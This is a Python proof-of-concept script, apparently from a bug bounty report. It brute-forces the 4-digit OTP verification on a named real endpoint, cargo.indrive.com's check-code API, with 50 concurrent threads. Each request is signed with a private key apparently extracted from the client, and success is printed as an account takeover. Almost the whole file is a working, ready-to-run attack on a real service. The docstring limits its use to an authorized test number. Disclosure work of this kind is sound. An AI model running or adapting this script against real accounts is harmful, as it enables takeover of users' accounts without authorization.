"""
bruteforce_otp.py

Demonstrates Vulnerability #3: no rate limiting / lockout on OTP
verification, allowing the full 4-digit keyspace (10,000 combinations)
to be brute-forced.

Run only against an auth_id obtained from an authorized test number
via request_otp.py, under the terms of the relevant bug bounty program.
"""

import concurrent.futures
import requests

from extract_key import load_private_key, sign, JWK
from request_otp import VICTIM_PHONE, COUNTRY_CODE

ENDPOINT = "https://cargo.indrive.com/proxy/auth/check-code"
MAX_WORKERS = 50


def try_code(code: str, auth_id: str, private_key) -> bool:
    payload = {
        "phone": VICTIM_PHONE,
        "code": code,
        "auth_id": auth_id,
        "phoneCode": COUNTRY_CODE,
        "locale": "en",
    }
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://cargo.indrive.com",
        "x-signature": sign(payload, private_key),
    }
    try:
        r = requests.post(ENDPOINT, json=payload, headers=headers, timeout=8)
    except requests.RequestException:
        return False

    if r.status_code == 200:
        print(f"[+] SUCCESS code={code}: {r.json()}")
        return True
    return False


def bruteforce(auth_id: str):
    private_key = load_private_key(JWK)
    codes = [str(i).zfill(4) for i in range(10000)]

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(try_code, code, auth_id, private_key): code
            for code in codes
        }
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                print("[+] Account takeover successful.")
                executor.shutdown(cancel_futures=True)
                return True
    print("[-] Exhausted keyspace without success.")
    return False


if __name__ == "__main__":
    # Populate with the auth_id returned by request_otp.py
    AUTH_ID = "<auth_id_from_request_otp>"
    bruteforce(AUTH_ID)
